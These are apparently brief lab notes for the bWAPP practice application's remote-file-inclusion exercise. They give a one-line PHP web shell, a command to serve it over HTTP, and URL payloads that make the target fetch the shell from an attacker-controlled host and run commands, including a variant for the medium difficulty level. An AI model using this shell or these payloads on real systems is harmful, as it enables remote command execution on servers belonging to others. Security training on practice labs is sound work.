1. Create a simple PHP shell and save it as a txt file - <?php echo system($_GET['cmd']);?>
2. Run python SimpleHTTPServer on the location of the file - python -m SimpleHTTPServer
3. Go to RFI & LFI ecercise preform a RFI attack via the url and run the ls command - language=http://[attacker ip]:8000/rfi.txt&cmd=ls
4. Preform the same on medium difficulty where bWAPP automatically adds the extension .php to the file:
	Change the file name to rfi.php
	 language=http://[attacker ip]:8000/rfi&cmd=ls